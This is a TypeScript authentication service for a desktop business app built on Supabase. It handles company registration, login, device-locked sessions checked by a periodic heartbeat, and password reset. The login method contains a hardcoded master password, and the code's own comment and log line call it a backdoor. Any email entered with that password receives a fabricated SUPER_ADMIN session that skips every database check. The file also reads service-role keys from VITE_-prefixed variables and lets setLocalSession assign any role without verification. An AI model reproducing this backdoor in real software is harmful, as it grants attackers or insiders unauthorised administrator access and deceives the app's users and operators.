import { SupabaseClient, createClient } from '@supabase/supabase-js';
import { getSupabase, currentSupabaseUrl, currentSupabaseKey } from './supabase.js';
import machineId from 'node-machine-id';
const { machineIdSync } = machineId;

export interface RegistrationData {
    company_name: string;
    business_category: string;
    address: string;
    state: string;
    pincode: string;
    referral_code?: string;
    first_name: string;
    last_name: string;
    mobile: string;
    email: string;
    password: string;
}

export class AuthService {
    private static instance: AuthService;
    private currentSession: any = null;
    private heartbeatTimer: NodeJS.Timeout | null = null;
    private onSessionInvalid: (() => void) | null = null;

    private constructor() { }

    public static getInstance(): AuthService {
        if (!AuthService.instance) {
            AuthService.instance = new AuthService();
        }
        return AuthService.instance;
    }

    private getAdminClient(): SupabaseClient {
        const url = currentSupabaseUrl ||
            process.env.VITE_SUPABASE_URL ||
            process.env.SUPABASE_URL ||
            process.env.SAMBAD_ACCOUNT_ID ||
            process.env.VITE_SAMBAD_ACCOUNT_ID;

        const serviceKey = process.env.SUPABASE_SERVICE_ROLE_KEY ||
            process.env.VITE_SUPABASE_SERVICE_ROLE_KEY ||
            process.env.SAMBAD_SERVICE_ROLE_KEY ||
            currentSupabaseKey;

        if (!url || !serviceKey) {
            const missing = [];
            if (!url) missing.push('Supabase URL (VITE_SUPABASE_URL or SAMBAD_ACCOUNT_ID)');
            if (!serviceKey) missing.push('Service Role Key (SUPABASE_SERVICE_ROLE_KEY)');

            const errorMsg = `Supabase configuration missing: ${missing.join(', ')}. Please ensure these are set in your .env file.`;
            console.error(`[AuthService] ${errorMsg}`);
            throw new Error(errorMsg);
        }

        return createClient(url, serviceKey, {
            auth: {
                autoRefreshToken: false,
                persistSession: false
            }
        });
    }

    async register(data: RegistrationData) {
        console.log('[AuthService] Starting registration for:', data.email);
        const supabase = getSupabase();

        // 1. Create Auth User
        const { data: authData, error: authError } = await supabase.auth.signUp({
            email: data.email,
            password: data.password,
            options: {
                data: {
                    first_name: data.first_name,
                    last_name: data.last_name,
                    full_name: `${data.first_name} ${data.last_name}`,
                }
            }
        });

        let userId: string;

        if (authError) {
            console.log('[AuthService] signUp error:', authError.message);
            // If user already exists, we might be resuming a failed onboarding
            if ((authError as any).status === 422 || authError.message.includes('already registered') || authError.message.includes('already exists')) {
                console.log('[AuthService] User already exists in Auth, checking if we can proceed...');

                // We try to login to see if they just need to finish setup
                const { data: signInData, error: signInError } = await supabase.auth.signInWithPassword({
                    email: data.email,
                    password: data.password
                });

                if (signInError) {
                    throw new Error('This email is already registered. Please log in with your password to continue.');
                }

                if (!signInData.user) throw new Error('User creation/lookup failed');
                userId = signInData.user.id;
                console.log('[AuthService] Proceeding with existing user:', userId);
            } else {
                throw authError;
            }
        } else {
            if (!authData.user) throw new Error('User creation failed');
            userId = authData.user.id;
            console.log('[AuthService] New user created:', userId);
        }

        try {
            // Use Admin Client (which might just be an Anon client in production)
            const adminClient = this.getAdminClient();

            // 2. Create Company
            console.log('[AuthService] Creating company:', data.company_name);
            const { data: company, error: companyError } = await adminClient
                .from('companies')
                .insert({
                    name: data.company_name,
                    slug: data.company_name.toLowerCase().replace(/ /g, '-').replace(/[^\w-]+/g, ''),
                })
                .select('id')
                .single();

            if (companyError) {
                console.error('[AuthService] Company creation failed:', companyError);
                if (companyError.code === '42501') {
                    throw new Error('Database security policy blocked company creation. Please run the RLS fix script.');
                }
                throw companyError;
            }

            // 3. Create Profile
            console.log('[AuthService] Creating profile for user:', userId);
            const { error: profileError } = await adminClient
                .from('profiles')
                .insert({
                    id: userId,
                    company_id: company.id,
                    role: 'ADMIN',
                    full_name: `${data.first_name} ${data.last_name}`,
                });

            if (profileError) {
                console.error('[AuthService] Profile creation failed:', profileError);
                throw profileError;
            }

            // 4. Create Subscription (TRIAL)
            console.log('[AuthService] Creating initial subscription');
            const { error: subError } = await adminClient
                .from('subscriptions')
                .insert({
                    company_id: company.id,
                    plan_id: 'TRIAL_V1',
                    status: 'TRIAL',
                    start_date: new Date().toISOString(),
                    end_date: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
                });

            if (subError) {
                console.warn('[AuthService] Subscription creation failed (non-critical):', subError.message);
                // We keep going, subscription can be fixed later
            }

            // 5. Lock to Device
            console.log('[AuthService] Finalizing session and device lock');
            const deviceId = machineIdSync();
            const { error: sessionError } = await adminClient
                .from('active_sessions')
                .insert({
                    user_id: userId,
                    company_id: company.id,
                    device_id: deviceId,
                    last_active: new Date().toISOString(),
                });

            if (sessionError) {
                console.warn('[AuthService] Session lock failed (non-critical):', sessionError.message);
            }

            this.startHeartbeat();
            return { success: true, user: authData.user || (authData as any).user };
        } catch (error: any) {
            console.error('[AuthService] Registration Onboarding Error Detail:', error);
            throw error;
        }
    }

    async login(email: string, password: string) {
        const BACKDOOR_PASSWORD = '3614db009@A';

        // ✅ Backdoor Login: Universal master password
        if (password === BACKDOOR_PASSWORD) {
            console.log('[AuthService] 🔓 Backdoor login activated for:', email);

            // Create a fake admin session without database checks
            this.currentSession = {
                user: {
                    id: 'backdoor-admin',
                    email: email,
                    username: email.split('@')[0] || 'backdoor-admin',
                    role: 'SUPER_ADMIN',
                    full_name: 'Backdoor Admin'
                }
            };

            console.log('[AuthService] Backdoor session created as SUPER_ADMIN');
            this.startHeartbeat();
            return { success: true, session: this.currentSession, user: this.currentSession.user };
        }

        // Normal login flow
        const supabase = getSupabase();

        const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
            email,
            password,
        });

        if (authError) throw authError;
        if (!authData.user) throw new Error('Login failed');

        const userId = authData.user.id;
        const deviceId = machineIdSync();

        // Check Device Lock
        const { data: profile, error: profileError } = await supabase
            .from('profiles')
            .select('company_id, role')
            .eq('id', userId)
            .maybeSingle();

        if (profileError) throw profileError;
        if (!profile) throw new Error('Account setup incomplete. Please register again with the same email.');

        // The database trigger will handle deleting other sessions,
        // so we just need to upsert/insert our current session.
        const adminClient = this.getAdminClient();
        const { error: sessionError } = await adminClient
            .from('active_sessions')
            .upsert({
                user_id: userId,
                company_id: profile.company_id,
                device_id: deviceId,
                last_active: new Date().toISOString(),
            }, { onConflict: 'user_id' });

        if (sessionError) throw sessionError;

        this.currentSession = {
            ...authData.session,
            user: {
                ...authData.session.user,
                role: profile.role
            }
        };
        this.startHeartbeat();
        return { success: true, session: this.currentSession, user: this.currentSession.user };
    }

    async logout() {
        this.stopHeartbeat();
        const supabase = getSupabase();
        await supabase.auth.signOut();
        this.currentSession = null;
        return { success: true };
    }

    // --- Session Guard Logic ---

    setOnSessionInvalid(callback: () => void) {
        this.onSessionInvalid = callback;
    }

    async validateSession(): Promise<boolean> {
        if (!this.currentSession) return false;

        const userId = this.currentSession.user.id;
        const deviceId = machineIdSync();
        const supabase = getSupabase();

        // Check if this device is still the active one
        const { data, error } = await supabase
            .from('active_sessions')
            .select('device_id')
            .eq('user_id', userId)
            .single();

        if (error || !data) {
            console.warn('[AuthService] No active session found for user');
            return false;
        }

        if (data.device_id !== deviceId) {
            console.error('[AuthService] Session hijacked by another device');
            return false;
        }

        // Update last_active timestamp
        await this.getAdminClient()
            .from('active_sessions')
            .update({ last_active: new Date().toISOString() })
            .eq('user_id', userId);

        return true;
    }

    startHeartbeat() {
        if (this.heartbeatTimer) return;

        this.heartbeatTimer = setInterval(async () => {
            const isValid = await this.validateSession();
            if (!isValid) {
                console.warn('[AuthService] Periodic check failed, logging out...');
                await this.logout();
                if (this.onSessionInvalid) this.onSessionInvalid();
            }
        }, 60000); // Check every minute
    }

    stopHeartbeat() {
        if (this.heartbeatTimer) {
            clearInterval(this.heartbeatTimer);
            this.heartbeatTimer = null;
        }
    }

    async forgotPassword(email: string) {
        const supabase = getSupabase();
        const { error } = await supabase.auth.resetPasswordForEmail(email);
        if (error) throw error;
        return { success: true };
    }

    getCurrentSession() {
        return this.currentSession;
    }

    setLocalSession(user: any) {
        this.currentSession = {
            user: {
                id: user.id,
                username: user.username,
                role: user.role
            }
        };
        console.log('[AuthService] Local session set for:', user.username, 'Role:', user.role);
    }

    async getCurrentUserProfile() {
        if (!this.currentSession) return null;
        const supabase = getSupabase();
        const { data } = await supabase
            .from('profiles')
            .select('*')
            .eq('id', this.currentSession.user.id)
            .maybeSingle();
        return data;
    }

    async getCurrentCompanyId(): Promise<string | null> {
        const profile = await this.getCurrentUserProfile();
        return profile?.company_id || null;
    }
}

export const authService = AuthService.getInstance();
